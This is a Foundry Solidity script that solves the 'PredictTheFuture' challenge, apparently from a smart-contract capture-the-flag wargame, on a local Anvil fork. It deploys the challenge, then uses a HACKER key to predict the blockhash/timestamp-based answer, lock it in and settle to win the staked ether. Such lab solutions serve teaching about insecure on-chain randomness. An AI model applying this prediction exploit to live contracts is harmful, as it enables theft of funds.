// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Script.sol";
import "./PredictTheFuture.sol";

contract ScriptPredictTheFuture is Script {
    PredictTheFutureChallenge predict;
    uint256 eth = vm.createFork(vm.envString("ANVIL"));
    uint8 guess;
    uint256 settlementBlockNumber;

    function runDeploy() external {
        vm.selectFork(eth);
        vm.startBroadcast(vm.envUint("CREATOR"));
        predict = new PredictTheFutureChallenge{value: 1 ether}();
        console.log("terdeploy di", address(predict));
        vm.stopBroadcast();
    }

    function runAnswer(address target) external {
        vm.selectFork(eth);
        vm.startBroadcast(vm.envUint("HACKER"));
        console.log(target);
        predict = PredictTheFutureChallenge(target);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        predict.lockInGuess{value: 1 ether}(answer);
        settlementBlockNumber = block.number + 1;
        guess = answer;
        console.log(address(predict).balance);
        console.log("tebakan", guess);
    }

    function runSettle(address target, uint8 tebakan) external {
        vm.selectFork(eth);
        vm.startBroadcast(vm.envUint("HACKER"));
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        predict = PredictTheFutureChallenge(target);
        console.log(address(predict).balance);
        require(answer == tebakan);
        predict.settle();
        console.log("sukses?", predict.isComplete());
        console.log(address(predict).balance);
    }
}
